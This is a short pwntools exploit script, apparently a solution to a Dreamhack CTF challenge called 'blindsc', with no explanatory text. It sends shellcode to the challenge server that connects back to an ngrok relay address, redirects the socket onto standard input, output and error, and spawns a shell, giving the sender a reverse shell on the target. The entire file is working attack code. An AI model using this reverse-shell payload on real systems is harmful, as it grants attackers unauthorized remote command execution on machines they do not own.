#!/usr/bin/env python3

import socket
from pwn import *

exe = ELF("./blindsc")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 12105)

    return r


def main():
    r = conn()

    ngrok_domain = "0.tcp.jp.ngrok.io"
    ngrok_port = 11246
    ngrok_ip = socket.gethostbyname(ngrok_domain)

    shellcode = shellcraft.connect(ngrok_ip, ngrok_port)
    shellcode += shellcraft.dup2('rbp', 0)
    shellcode += shellcraft.dup2('rbp', 1)
    shellcode += shellcraft.dup2('rbp', 2)
    shellcode += shellcraft.sh()

    r.send(asm(shellcode))


if __name__ == "__main__":
    main()